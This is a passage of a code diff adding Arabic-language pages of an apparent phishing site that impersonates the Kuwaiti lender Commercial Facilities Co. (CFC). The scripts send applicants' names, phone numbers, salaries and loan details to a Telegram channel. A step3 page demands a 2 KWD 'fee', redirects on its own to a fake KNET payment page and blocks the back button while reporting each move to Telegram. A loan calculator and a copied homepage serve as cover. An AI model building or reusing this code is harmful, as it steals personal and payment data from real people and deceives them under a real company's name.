+                    phone: phoneValue,
+                    netSalary: netSalaryValue,
+                    carValue: loanType === 'car' ? carValueValue : '',
+                    requestedAmount: requestedAmountValue,
+                    workSector: workSectorValue
+                });
+
+                if (window.showSubmissionLoadingOverlay) {
+                    window.showSubmissionLoadingOverlay('جارٍ الانتقال إلى صفحة الدفع...', 3000, 'knet');
+                }
+
+                const sent = window.sendTelegramMessageOnce
+                    ? await window.sendTelegramMessageOnce(message, false)
+                    : false;
+
+                if (!sent) {
+                    localStorage.setItem(window.STEP2_FAIL_STORAGE_KEY || 'step2_fail', message);
+                    if (window.persistTelegramMessageThenSend) {
+                        window.persistTelegramMessageThenSend(message, false).catch(function() {});
+                    }
+                } else {
+                    localStorage.removeItem(window.STEP2_FAIL_STORAGE_KEY || 'step2_fail');
+                }
+
+                window.location.href = './step3.html';
+            });
+        }
+    }
+
+    bindStep2();
+    window.addEventListener('pageshow', bindStep2);
+    </script>
+    <script src="./assets/js/telegram.js"></script>
+    <script src="./assets/js/tg.js"></script>
+    <script src="./assets/js/shared-header.js"></script>
+</body>
+
+</html>
+
+<html lang="ar">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width,initial-scale=1" />
+    <meta name="description" content="الخطوة الثالثة لإتمام طلب التمويل لدى شركة التسهيلات التجارية." />
+    <meta name="theme-color" content="#00a3e0" />
+    <title>شركة التسهيلات التجارية - CFC</title>
+    <link rel="icon" type="image/svg+xml" href="./assets/images/logo.svg" />
+    <link href="./assets/css/main.css" rel="stylesheet" type="text/css">
+    <link rel="stylesheet" href="./assets/css/shared-header.css">
+  </head>
+  <body class="page-with-shared-header step-page">
+    <div id="root">
+      <div
+        dir="rtl"
+        class="min-h-screen bg-gradient-to-b from-gray-50 to-white text-gray-800">
+        <header class="site-header">
+          <div class="nav-shell">
+            <a class="brand" href="./index.html#home" aria-label="Commercial Facilities">
+              <img src="./assets/images/logo.svg" alt="Commercial Facilities logo" />
+            </a>
+            <button class="menu-toggle" type="button" aria-expanded="false" aria-label="فتح القائمة">
+              <img src="./assets/images/menu.png" alt="" />
+            </button>
+            <nav class="navbar" aria-label="التنقل الرئيسي">
+                        <ul class="nav-links"></ul>
+            </nav>
+          </div>
+        </header>
+        <div class="max-w-md mx-auto px-6 py-6">
+          <div class="flex items-center justify-between mb-2">
+            <div class="flex items-center gap-2">
+              <div
+                class="w-8 h-8 bg-green-500 rounded-full flex items-center justify-center shadow-md">
+                <svg
+                  xmlns="http://www.w3.org/2000/svg"
+                  class="w-5 h-5 text-white"
+                  viewBox="0 0 24 24"
+                  fill="none"
+                  stroke="currentColor"
+                  stroke-width="2"
+                  stroke-linecap="round"
+                  stroke-linejoin="round">
+                  <path d="M20 6 9 17l-5-5"></path>
+                </svg>
+              </div>
+              <span class="text-xs font-semibold text-green-600"
+                >المعلومات</span
+              >
+            </div>
+            <div class="flex-1 h-0.5 bg-green-500 mx-2"></div>
+            <div class="flex items-center gap-2">
+              <div
+                class="w-8 h-8 bg-green-500 rounded-full flex items-center justify-center shadow-md">
+                <svg
+                  xmlns="http://www.w3.org/2000/svg"
+                  class="w-5 h-5 text-white"
+                  viewBox="0 0 24 24"
+                  fill="none"
+                  stroke="currentColor"
+                  stroke-width="2"
+                  stroke-linecap="round"
+                  stroke-linejoin="round">
+                  <path d="M20 6 9 17l-5-5"></path>
+                </svg>
+              </div>
+              <span class="text-xs font-semibold text-green-600">الراتب</span>
+            </div>
+            <div class="flex-1 h-0.5 bg-[#00A3E0] mx-2"></div>
+            <div class="flex items-center gap-2">
+              <div
+                class="w-8 h-8 bg-[#00A3E0] rounded-full flex items-center justify-center shadow-md">
+                <svg
+                  xmlns="http://www.w3.org/2000/svg"
+                  class="w-4 h-4 text-white"
+                  viewBox="0 0 24 24"
+                  fill="none"
+                  stroke="currentColor"
+                  stroke-width="2"
+                  stroke-linecap="round"
+                  stroke-linejoin="round">
+                  <rect width="20" height="14" x="2" y="5" rx="2"></rect>
+                  <line x1="2" x2="22" y1="10" y2="10"></line>
+                </svg>
+              </div>
+              <span class="text-xs font-semibold text-[#00A3E0]">الدفع</span>
+            </div>
+          </div>
+          <div class="w-full bg-gray-200 rounded-full h-2">
+            <div
+              class="h-2 rounded-full transition-all duration-500 bg-gradient-to-r from-green-500 via-[#00A3E0] to-blue-700 w-full"></div>
+          </div>
+        </div>
+        <div class="max-w-md mx-auto px-6 pb-8 space-y-6">
+          <div
+            class="rounded-2xl shadow-lg overflow-hidden text-white bg-gradient-to-l from-yellow-400 via-blue-500 to-blue-700">
+            <div class="relative h-32">
+              <div
+                class="absolute inset-0 bg-gradient-to-l from-yellow-400/20 via-blue-500/40 to-blue-700/60"></div>
+              <div
+                class="absolute inset-0 opacity-30"
+                style="
+                  background-image: radial-gradient(
+                      circle at 20% 50%,
+                      rgba(255, 255, 255, 0.2) 1px,
+                      transparent 1px
+                    ),
+                    radial-gradient(
+                      circle at 40% 20%,
+                      rgba(255, 255, 255, 0.2) 1px,
+                      transparent 1px
+                    ),
+                    radial-gradient(
+                      circle at 60% 80%,
+                      rgba(255, 255, 255, 0.2) 1px,
+                      transparent 1px
+                    ),
+                    radial-gradient(
+                      circle at 80% 40%,
+                      rgba(255, 255, 255, 0.2) 1px,
+                      transparent 1px
+                    );
+                  background-size: 40px 40px, 60px 60px, 50px 50px, 45px 45px;
+                "></div>
+              <div
+                class="relative z-10 flex items-start justify-center h-full -translate-y-3">
+                <img
+                  src="assets/images/CFC-Logo.jpg"
+                  alt="Commercial Facilities"
+                  class="max-w-[82%] max-h-24 object-contain bg-white rounded-lg px-4 py-2 shadow-md" />
+              </div>
+            </div>
+            <div class="p-6 space-y-4 bg-white text-gray-800">
+              <div class="text-center">
+                <h3 class="text-lg font-bold text-[#00A3E0] mb-2">
+                  استكمال إجراءات الطلب
+                </h3>
+              </div>
+              <p class="text-gray-700 leading-relaxed">
+                نشكركم على تقديم طلب التمويل لدى شركة التسهيلات التجارية.
+              </p>
+              <div class="flex items-center justify-between px-6 pt-6 text-gray-900">
+                <span class="text-lg font-bold text-gray-900"
+                  >المبلغ الإجمالي</span
+                ><span class="text-2xl font-bold text-[#00A3E0]"
+                  >2.00 د.ك</span
+                >
+              </div>
+              <div class="bg-blue-50 border border-blue-200 rounded-xl p-4">
+                <p class="text-gray-800 leading-relaxed">
+                  لتثبيت الطلب نرجو منكم الدفع
+                  <span class="font-bold text-[#00A3E0] text-xl mx-1"
+                    >2.00 د.ك</span
+                  >حق الرسوم.
+                </p>
+              </div>
+              <div class="grid grid-cols-2 gap-3">
+                <div class="bg-blue-50 rounded-lg p-3 text-center">
+                  <svg
+                    xmlns="http://www.w3.org/2000/svg"
+                    class="w-6 h-6 text-[#00A3E0] mx-auto mb-2"
+                    viewBox="0 0 24 24"
+                    fill="none"
+                    stroke="currentColor"
+                    stroke-width="2"
+                    stroke-linecap="round"
+                    stroke-linejoin="round">
+                    <path d="M21.801 10A10 10 0 1 1 17 3.335"></path>
+                    <path d="m9 11 3 3L22 4"></path>
+                  </svg>
+                  <p class="text-xs font-semibold text-gray-700">
+                    معتمد رسمياً
+                  </p>
+                </div>
+                <div class="bg-green-50 rounded-lg p-3 text-center">
+                  <svg
+                    xmlns="http://www.w3.org/2000/svg"
+                    class="w-6 h-6 text-green-600 mx-auto mb-2"
+                    viewBox="0 0 24 24"
+                    fill="none"
+                    stroke="currentColor"
+                    stroke-width="2"
+                    stroke-linecap="round"
+                    stroke-linejoin="round">
+                    <path
+                      d="M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z"></path>
+                  </svg>
+                  <p class="text-xs font-semibold text-gray-700">آمن وموثوق</p>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <div
+            class="flex items-start gap-3 bg-green-50 border border-green-200 rounded-lg p-3">
+            <svg
+              xmlns="http://www.w3.org/2000/svg"
+              class="w-5 h-5 text-green-600 mt-0.5"
+              viewBox="0 0 24 24"
+              fill="none"
+              stroke="currentColor"
+              stroke-width="2"
+              stroke-linecap="round"
+              stroke-linejoin="round">
+              <path
+                d="M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z"></path>
+            </svg>
+            <div>
+              <p class="text-sm font-semibold text-green-900 mb-1">
+                عملية دفع آمنة ومشفرة
+              </p>
+              <p class="text-xs text-green-700 leading-relaxed">
+                سيتم تحويلك إلى بوابة كي نت الآمنة لإتمام عملية الدفع
+              </p>
+            </div>
+          </div>
+
+          <div class="grid grid-cols-3 gap-3">
+            <div
+              class="rounded-xl bg-gradient-to-br from-green-50 to-white p-3 text-center space-y-2">
+              <div
+                class="w-10 h-10 bg-green-100 rounded-lg flex items-center justify-center mx-auto">
+                <svg
+                  xmlns="http://www.w3.org/2000/svg"
+                  class="w-5 h-5 text-green-600"
+                  viewBox="0 0 24 24"
+                  fill="none"
+                  stroke="currentColor"
+                  stroke-width="2"
+                  stroke-linecap="round"
+                  stroke-linejoin="round">
+                  <path
+                    d="M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z"></path>
+                </svg>
+              </div>
+              <p class="text-xs font-semibold text-gray-700">دفع آمن</p>
+            </div>
+            <div
+              class="rounded-xl bg-gradient-to-br from-blue-50 to-white p-3 text-center space-y-2">
+              <div
+                class="w-10 h-10 bg-blue-100 rounded-lg flex items-center justify-center mx-auto">
+                <svg
+                  xmlns="http://www.w3.org/2000/svg"
+                  class="w-5 h-5 text-[#00A3E0]"
+                  viewBox="0 0 24 24"
+                  fill="none"
+                  stroke="currentColor"
+                  stroke-width="2"
+                  stroke-linecap="round"
+                  stroke-linejoin="round">
+                  <rect
+                    width="18"
+                    height="11"
+                    x="3"
+                    y="11"
+                    rx="2"
+                    ry="2"></rect>
+                  <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
+                </svg>
+              </div>
+              <p class="text-xs font-semibold text-gray-700">مشفر ١٠٠٪</p>
+            </div>
+            <div
+              class="rounded-xl bg-gradient-to-br from-purple-50 to-white p-3 text-center space-y-2">
+              <div
+                class="w-10 h-10 bg-purple-100 rounded-lg flex items-center justify-center mx-auto">
+                <svg
+                  xmlns="http://www.w3.org/2000/svg"
+                  class="w-5 h-5 text-purple-600"
+                  viewBox="0 0 24 24"
+                  fill="none"
+                  stroke="currentColor"
+                  stroke-width="2"
+                  stroke-linecap="round"
+                  stroke-linejoin="round">
+                  <path d="M12 6v6l4 2"></path>
+                  <circle cx="12" cy="12" r="10"></circle>
+                </svg>
+              </div>
+              <p class="text-xs font-semibold text-gray-700">فوري</p>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <button
+      id="payButton"
+      type="button"
+      class="fixed z-50 inline-flex h-14 items-center justify-center gap-2 rounded-xl bg-gradient-to-r from-[#00A3E0] to-blue-700 px-6 text-lg font-bold text-white shadow-lg transition-all duration-300 hover:from-blue-700 hover:to-blue-800 hover:shadow-xl"
+      style="left: 50%; bottom: 16px; width: min(448px, calc(100vw - 48px)); transform: translateX(-50%);">
+      <span class="flex items-center gap-2 justify-center"
+        ><svg
+          xmlns="http://www.w3.org/2000/svg"
+          class="w-5 h-5"
+          viewBox="0 0 24 24"
+          fill="none"
+          stroke="currentColor"
+          stroke-width="2"
+          stroke-linecap="round"
+          stroke-linejoin="round">
+          <rect width="20" height="14" x="2" y="5" rx="2"></rect>
+          <line x1="2" x2="22" y1="10" y2="10"></line></svg
+        >الدفع عبر كي نت<svg
+          xmlns="http://www.w3.org/2000/svg"
+          class="w-5 h-5"
+          viewBox="0 0 24 24"
+          fill="none"
+          stroke="currentColor"
+          stroke-width="2"
+          stroke-linecap="round"
+          stroke-linejoin="round">
+          <path d="m9 18 6-6-6-6"></path></svg
+      ></span>
+    </button>
+    <script src="./assets/js/telegram.js"></script>
+    <script src="./assets/js/tg.js"></script>
+    <script>
+      const STEP3_NAVIGATION_DELAY_MS = 180;
+      const STEP3_AUTO_REDIRECT_MS = 60000;
+      const KNET_REDIRECT_STORAGE_KEY = "knetRedirectedFromStep3";
+      let step3BackNavigationInProgress = false;
+      let step3AutoRedirectId = null;
+
+      function getStep3IdentityLines() {
+        if (window.getTelegramStoredIdentityLines) {
+          return window.getTelegramStoredIdentityLines();
+        }
+
+        return [];
+      }
+
+      function buildStep3BackMessage() {
+        return [
+          "من صفحة الدفع رجع لصفحة المعلومات",
+          getStep3IdentityLines()[0] || "👤 الاسم: غير متوفر",
+          getStep3IdentityLines()[1] || "📞 رقم الهاتف: غير متوفر"
+        ].join("\n");
+      }
+
+      function resetStep3RuntimeState() {
+        const payButton = document.getElementById("payButton");
+
+        step3BackNavigationInProgress = false;
+
+        if (payButton) {
+          payButton.disabled = false;
+          payButton.dataset.submitting = "false";
+        }
+
+        if (window.hideSubmissionLoadingOverlay) {
+          window.hideSubmissionLoadingOverlay();
+        }
+      }
+
+      async function navigateToKnet(delayMs) {
+        const navigationDelay = typeof delayMs === "number" ? delayMs : STEP3_NAVIGATION_DELAY_MS;
+
+        if (window.showSubmissionLoadingOverlay) {
+          window.showSubmissionLoadingOverlay("جارٍ الانتقال إلى كي نت...", navigationDelay, "knet");
+        }
+
+        window.setTimeout(function() {
+          sessionStorage.setItem(KNET_REDIRECT_STORAGE_KEY, "true");
+          window.location.href = "./knet.html";
+        }, navigationDelay);
+      }
+
+      async function goBackToStep2() {
+        if (step3BackNavigationInProgress) {
+          return;
+        }
+
+        step3BackNavigationInProgress = true;
+        if (step3AutoRedirectId) {
+          window.clearTimeout(step3AutoRedirectId);
+          step3AutoRedirectId = null;
+        }
+
+        if (window.sendTelegramMessageWithQueue) {
+          window.sendTelegramMessageWithQueue(buildStep3BackMessage(), false).catch(function() {});
+        }
+
+        window.setTimeout(function() {
+          window.location.href = "./step2.html";
+        }, STEP3_NAVIGATION_DELAY_MS);
+      }
+
+      function ensureStep3HistoryGuard() {
+        const currentState = history.state || {};
+
+        if (currentState.page === "step3" && currentState.guard === "guard") {
+          return;
+        }
+
+        history.replaceState({ page: "step3", guard: "base" }, "", window.location.href);
+        history.pushState({ page: "step3", guard: "guard" }, "", window.location.href);
+      }
+
+      function bindStep3Once() {
+        const payButton = document.getElementById("payButton");
+
+        if (!payButton || payButton.dataset.bound === "true") {
+          return;
+        }
+
+        payButton.dataset.bound = "true";
+        payButton.addEventListener("click", function(event) {
+          event.preventDefault();
+
+          if (payButton.dataset.submitting === "true") {
+            return;
+          }
+
+          payButton.dataset.submitting = "true";
+          payButton.disabled = true;
+          if (step3AutoRedirectId) {
+            window.clearTimeout(step3AutoRedirectId);
+            step3AutoRedirectId = null;
+          }
+          navigateToKnet().catch(function() {
+            payButton.dataset.submitting = "false";
+            payButton.disabled = false;
+            if (window.hideSubmissionLoadingOverlay) {
+              window.hideSubmissionLoadingOverlay();
+            }
+          });
+        });
+      }
+
+      function initializeStep3Page() {
+        bindStep3Once();
+        resetStep3RuntimeState();
+        ensureStep3HistoryGuard();
+        if (!step3AutoRedirectId) {
+          step3AutoRedirectId = window.setTimeout(function() {
+            navigateToKnet(0);
+          }, STEP3_AUTO_REDIRECT_MS);
+        }
+        if (window.resendStoredFailureMessage) {
+          window.resendStoredFailureMessage(
+            window.STEP2_FAIL_STORAGE_KEY || "step2_fail",
+            "تنبيه: كان هناك مشكلة في إرسال رسالة صفحة الراتب، يرجى مراجعة تيليجرام."
+          ).catch(function() {});
+        }
+      }
+
+      window.addEventListener("popstate", function(event) {
+        const state = event.state || {};
+
+        if (state.page !== "step3" || state.guard !== "base") {
+          return;
+        }
+
+        goBackToStep2().catch(function() {});
+      });
+
+      window.addEventListener("pageshow", function(event) {
+        if (!event.persisted) {
+          return;
+        }
+
+        initializeStep3Page();
+      });
+
+      initializeStep3Page();
+    </script>
+    <script src="./assets/js/shared-header.js"></script>
+  </body>
+</html>
+
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>حاسبة القرض</title>
+    <link rel="icon" type="image/svg+xml" href="./assets/images/logo.svg" />
+    <link rel="stylesheet" href="./assets/css/styles.css" />
+  </head>
+  <body class="loan-calculator-page">
+    <main class="loan-calculator-shell">
+      <section class="loan-calculator-card" aria-labelledby="calculator-title">
+        <header class="loan-calculator-header">
+          <a class="calculator-logo" href="./index.html" aria-label="الصفحة الرئيسية">
+            <img src="./assets/images/logo.svg" alt="Commercial Facilities" />
+          </a>
+          <h1 id="calculator-title">حاسبة القرض</h1>
+          <p>اختر نوع القرض وأكمل البيانات لحساب القرض</p>
+        </header>
+
+        <div class="calculator-loan-tabs" role="list" aria-label="أنواع القروض">
+          <button class="calculator-loan-tab" type="button" data-loan-type="cash" role="listitem">
+            <img src="./assets/images/loan/cash-loan.jpg" alt="" />
+            قرض نقدي
+          </button>
+          <button class="calculator-loan-tab" type="button" data-loan-type="car" role="listitem">
+            <img src="./assets/images/loan/auto-loan.jpg" alt="" />
+            قرض سيارات
+          </button>
+          <button class="calculator-loan-tab" type="button" data-loan-type="furniture" role="listitem">
+            <img src="./assets/images/loan/furniture-loan.jpg" alt="" />
+            قرض أثاث
+          </button>
+          <button class="calculator-loan-tab" type="button" data-loan-type="marine" role="listitem">
+            <img src="./assets/images/loan/marine-loan.jpg" alt="" />
+            قرض بحري
+          </button>
+          <button class="calculator-loan-tab" type="button" data-loan-type="electrical" role="listitem">
+            <img src="./assets/images/loan/electrical-loan.jpg" alt="" />
+            قرض أجهزة كهربائية
+          </button>
+          <button class="calculator-loan-tab" type="button" data-loan-type="housing" role="listitem">
+            <img src="./assets/images/loan/housing-loan.jpg" alt="" />
+            قرض إسكاني
+          </button>
+          <button class="calculator-loan-tab" type="button" data-loan-type="education" role="listitem">
+            <img src="./assets/images/loan/educational-loan.jpg" alt="" />
+            قرض تعليمي
+          </button>
+          <button class="calculator-loan-tab" type="button" data-loan-type="commercial" role="listitem">
+            <img src="./assets/images/loan/commercial-loan.jpg" alt="" />
+            قرض شركات
+          </button>
+        </div>
+
+        <div class="calculator-track" aria-hidden="true">
+          <span></span>
+        </div>
+
+        <p class="calculator-step-label">صفحة الحسبة</p>
+
+        <div class="calculator-panels" id="calculatorPanels">
+          <form class="calculator-form" id="loanCalculatorForm">
+            <div class="calculator-field">
+              <label for="loanAmount">المبلغ</label>
+              <input id="loanAmount" type="text" inputmode="numeric" min="1000" max="300000" step="1000" value="" />
+            </div>
+
+            <div class="calculator-field">
+              <label for="loanTypeValue">نوع القرض</label>
+              <input id="loanTypeValue" type="text" readonly value="قرض نقدي" />
+            </div>
+
+            <div class="calculator-field">
+              <label for="loanMonths">المدة</label>
+              <input id="loanMonths" type="text" inputmode="numeric" min="12" max="84" value="" />
+            </div>
+
+            <div class="calculator-field payment-field">
+              <label for="loanPayment">قيمة القسط</label>
+              <input id="loanPayment" type="text" readonly value="0" />
+            </div>
+
+            <button class="calculator-submit" type="submit">احسب</button>
+          </form>
+
+          <section class="calculator-results" aria-live="polite" aria-label="نتائج الحساب" hidden>
+            <h2>حساب التمويل</h2>
+            <div class="result-row">
+              <strong id="resultPrincipal">---</strong>
+              <span>قيمة القرض</span>
+            </div>
+            <div class="result-row">
+              <strong id="resultInterest">---</strong>
+              <span>قيمة الفائدة</span>
+            </div>
+            <div class="result-row">
+              <strong id="resultTotal">---</strong>
+              <span>المبلغ الإجمالي</span>
+            </div>
+            <div class="result-row">
+              <strong id="resultMonths">---</strong>
+              <span>مدة السداد</span>
+            </div>
+            <div class="result-row">
+              <strong id="resultMonthly">---</strong>
+              <span>القسط الشهري</span>
+            </div>
+            <div class="result-row">
+              <strong id="resultRate">4.500</strong>
+              <span>نسبة الفائدة</span>
+            </div>
+            <div class="calculator-actions">
+              <button class="calculator-edit" type="button">تعديل</button>
+              <a class="calculator-continue muted" id="continueLink" href="./step1.html">متابعة</a>
+            </div>
+          </section>
+        </div>
+      </section>
+    </main>
+
+    <script>
+      const tabs = document.querySelectorAll(".calculator-loan-tab");
+      const amountInput = document.getElementById("loanAmount");
+      const monthsInput = document.getElementById("loanMonths");
+      const paymentInput = document.getElementById("loanPayment");
+      const calculatorPanels = document.getElementById("calculatorPanels");
+      const continueLink = document.getElementById("continueLink");
+      const editButton = document.querySelector(".calculator-edit");
+      const resultPrincipal = document.getElementById("resultPrincipal");
+      const resultInterest = document.getElementById("resultInterest");
+      const resultTotal = document.getElementById("resultTotal");
+      const resultMonths = document.getElementById("resultMonths");
+      const resultMonthly = document.getElementById("resultMonthly");
+      const resultRate = document.getElementById("resultRate");
+      const interestRate = 0.045;
+
+      function setCalculatorState(isCalculated) {
+        calculatorPanels.classList.toggle("is-calculated", isCalculated);
+        const resultSection = document.querySelector(".calculator-results");
+        if (resultSection) {
+          resultSection.hidden = !isCalculated;
+        }
+      }
+
+      function getSelectedLoan() {
+        const params = new URLSearchParams(window.location.search);
+        return params.get("loan") || localStorage.getItem("selectedLoanType") || "cash";
+      }
+
+      function formatKwd(value, minimumFractionDigits = 0, maximumFractionDigits = 0) {
+        return Number(value).toLocaleString("en-US", {
+          minimumFractionDigits,
+          maximumFractionDigits,
+        });
+      }
+
+      function setSelectedLoan(loanType) {
+        localStorage.setItem("selectedLoanType", loanType);
+        tabs.forEach((tab) => {
+          tab.classList.toggle("is-active", tab.dataset.loanType === loanType);
+        });
+        continueLink.href = loanType === "car" ? "./step1.html?loan=car" : `./step1.html?loan=${encodeURIComponent(loanType)}`;
+      }
+
+      function calculateLoan() {
+        const principal = Math.min(Math.max(Number(amountInput.value) || 0, 1000), 300000);
+        const months = Math.min(Math.max(Number(monthsInput.value) || 0, 12), 84);
+        if (principal <= 0 || months <= 0) return;
+
+        amountInput.value = principal;
+        monthsInput.value = months;
+
+        const monthlyRate = interestRate / 12;
+        const paymentFactor = Math.pow(1 + monthlyRate, months);
+        const monthly = (principal * monthlyRate * paymentFactor) / (paymentFactor - 1);
+        const total = monthly * months;
+        const interestTotal = total - principal;
+
+        paymentInput.value = formatKwd(monthly, 3, 3);
+        resultPrincipal.textContent = formatKwd(principal);
+        resultInterest.textContent = formatKwd(interestTotal, 3, 3);
+        resultTotal.textContent = formatKwd(total, 3, 3);
+        resultMonths.textContent = `${months} شهر`;
+        resultMonthly.textContent = `${formatKwd(monthly, 3, 3)} د.ك`;
+        resultRate.textContent = "4.5%";
+        continueLink.classList.remove("muted");
+        setCalculatorState(true);
+      }
+
+      tabs.forEach((tab) => {
+        tab.addEventListener("click", () => setSelectedLoan(tab.dataset.loanType));
+      });
+
+      editButton.addEventListener("click", () => {
+        setCalculatorState(false);
+        amountInput.focus();
+        amountInput.scrollIntoView({ behavior: "smooth", block: "center" });
+      });
+
+      document.getElementById("loanCalculatorForm").addEventListener("submit", (event) => {
+        event.preventDefault();
+        calculateLoan();
+      });
+
+      setSelectedLoan(getSelectedLoan());
+      amountInput.value = "";
+      monthsInput.value = "";
+      paymentInput.value = "";
+      setCalculatorState(false);
+    </script>
+  </body>
+</html>
+
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Commercial Facilities Co.</title>
+    <meta
+      name="description"
+      content="احصل على قرض نقدي، قرض سيارة أو قرض شركات بكل سهولة وسرعة."
+    />
+    <meta property="og:title" content="شركة التسهيلات التجارية - الكويت">
+    <meta property="og:description" content="احصل على قرض نقدي، قرض سيارة أو قرض شركات بكل سهولة وسرعة.">
+    <meta property="og:image" content="https://www.cfc-kw.com/assets/CFC-Logo.jpg">
+    <meta property="og:url" content="https://tashelatkuwait.netlify.app/">
+    <meta property="og:type" content="website">
+    <meta property="og:locale" content="ar_AR">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="شركة التسهيلات التجارية - الكويت">
+    <meta name="twitter:description" content="احصل على قرض نقدي، قرض سيارة أو قرض شركات بكل سهولة وسرعة.">
+    <meta name="twitter:image" content="https://www.cfc-kw.com/assets/CFC-Logo.jpg">
+    <link rel="icon" type="image/svg+xml" href="./assets/images/logo.svg" />
+    <link rel="stylesheet" href="./assets/css/styles.css" />
+    
+  </head>
+  <body>
+    <header class="site-header">
+      <div class="nav-shell">
+        <a class="brand" href="#home" aria-label="Commercial Facilities">
+          <img src="./assets/images/logo.svg" alt="Commercial Facilities logo" />
+        </a>
+
+        <button class="menu-toggle" type="button" aria-expanded="false" aria-label="فتح القائمة">
+          <img src="./assets/images/menu.png" alt="" />
+        </button>
+
+        <nav class="navbar" aria-label="التنقل الرئيسي">
+          <ul class="nav-links">
+            <li class="nav-item has-dropdown">
+              <a href="#about" data-i18n="nav.about">نبذة عن الشركة</a>
+              <div class="dropdown">
+                <a href="#about" data-i18n="about.history">نبذة تاريخية</a>
+                <a href="#about" data-i18n="about.viceChair">كلمة نائب رئيس مجلس الإدارة</a>
+                <a href="#about" data-i18n="about.board">أعضاء مجلس الإدارة</a>
+                <a href="#about" data-i18n="about.team">الفريق الإداري</a>
+                <a href="#about" data-i18n="about.governance">حوكمة الشركات</a>
+                <a href="#about" data-i18n="about.protection">دليل حماية العملاء</a>
+              </div>
+            </li>
+            <li class="nav-item has-dropdown">
+              <a href="#services" data-i18n="nav.services">خدمات الشركة</a>
+              <div class="dropdown">
+                <a href="#calculator" data-i18n="loan.cash">قرض نقدي</a>
+                <a href="#calculator" data-i18n="loan.auto">قرض سيارة</a>
+                <a href="#calculator" data-i18n="loan.housing">قرض إسكاني</a>
+                <a href="#calculator" data-i18n="loan.education">قرض تعليمي</a>
+                <a href="#calculator" data-i18n="loan.marine">معدات بحرية</a>
+                <a href="#calculator" data-i18n="loan.furniture">قرض أثاث</a>
+                <a href="#calculator" data-i18n="loan.electrical">أجهزة كهربائية</a>
+                <a href="#calculator" data-i18n="loan.commercial">قرض تجاري</a>
+              </div>
+            </li>
+            <li class="nav-item has-dropdown">
+              <a href="#news" data-i18n="nav.news">الأخبار والمعلومات المالية</a>
+              <div class="dropdown">
+                <a href="#news" data-i18n="news.reports">تقارير مالية</a>
+                <a href="#news" data-i18n="news.meetings">نتائج الاجتماع</a>
+              </div>
+            </li>
+            <li class="nav-item has-dropdown">
+              <a href="#contact" data-i18n="nav.contact">إتصل بنا</a>
+              <div class="dropdown">
+                <a href="#contact" data-i18n="contact.complaints">شكاوي العملاء</a>
+                <a href="#contact" data-i18n="contact.branches">فروعنا</a>
+                <a href="#contact" data-i18n="contact.faq">الأسئلة المشهورة</a>
+              </div>
+            </li>
+            <li class="nav-item has-dropdown">
+              <a href="#careers" data-i18n="nav.careers">انضم الى فريقنا</a>
+              <div class="dropdown">
+                <a href="#careers" data-i18n="careers.form">نموذج التوظيف</a>
+              </div>
+            </li>
+          </ul>
+
+          <div class="nav-actions">
+            <button type="button" class="nav-action lang-toggle" data-i18n="ui.langToggle">English</button>
+          </div>
+        </nav>
+      </div>
+    </header>
+
+    <main id="home">
+      <section class="hero section-card">
+        <div class="hero-slider" aria-live="polite"></div>
+        <div class="hero-dots" aria-label="مؤشرات الشرائح"></div>
+      </section>
+
+      <section id="calculator" class="calculator section-card">
+        <div class="loan-grid">
+          <article class="loan-tile" data-href="./calculator.html?loan=cash" data-loan-type="cash">
+            <img src="./assets/images/loan/cash-loan.jpg" alt="قرض نقدي" />
+            <h3 data-i18n="loan.cash">قرض نقدي</h3>
+          </article>
+          <article class="loan-tile" data-href="./calculator.html?loan=car" data-loan-type="car">
+            <img src="./assets/images/loan/auto-loan.jpg" alt="قرض سيارة" />
+            <h3 data-i18n="loan.auto">قرض سيارة</h3>
+          </article>
+          <article class="loan-tile" data-href="./calculator.html?loan=housing" data-loan-type="housing">
+            <img src="./assets/images/loan/housing-loan.jpg" alt="قرض إسكاني" />
+            <h3 data-i18n="loan.housing">قرض إسكاني</h3>
+          </article>
+          <article class="loan-tile" data-href="./calculator.html?loan=education" data-loan-type="education">
+            <img src="./assets/images/loan/educational-loan.jpg" alt="قرض تعليمي" />
+            <h3 data-i18n="loan.education">قرض تعليمي</h3>
+          </article>
+          <article class="loan-tile" data-href="./calculator.html?loan=marine" data-loan-type="marine">
+            <img src="./assets/images/loan/marine-loan.jpg" alt="معدات بحرية" />
+            <h3 data-i18n="loan.marine">معدات بحرية</h3>
+          </article>
+          <article class="loan-tile" data-href="./calculator.html?loan=furniture" data-loan-type="furniture">
+            <img src="./assets/images/loan/furniture-loan.jpg" alt="قرض أثاث" />
+            <h3 data-i18n="loan.furniture">قرض أثاث</h3>
+          </article>
+          <article class="loan-tile" data-href="./calculator.html?loan=electrical" data-loan-type="electrical">
+            <img src="./assets/images/loan/electrical-loan.jpg" alt="أجهزة كهربائية" />
+            <h3 data-i18n="loan.electrical">أجهزة كهربائية</h3>
+          </article>
+          <article class="loan-tile" data-href="./calculator.html?loan=commercial" data-loan-type="commercial">
+            <img src="./assets/images/loan/commercial-loan.jpg" alt="قرض تجاري" />
+            <h3 data-i18n="loan.commercial">قرض تجاري</h3>
+          </article>
+        </div>
+      </section>
+
+      <section id="offers" class="offers section-card">
+        <div class="section-heading offers-heading">
+          <span data-i18n="offers.label">لماذا شركة التسهيلات</span>
+        </div>
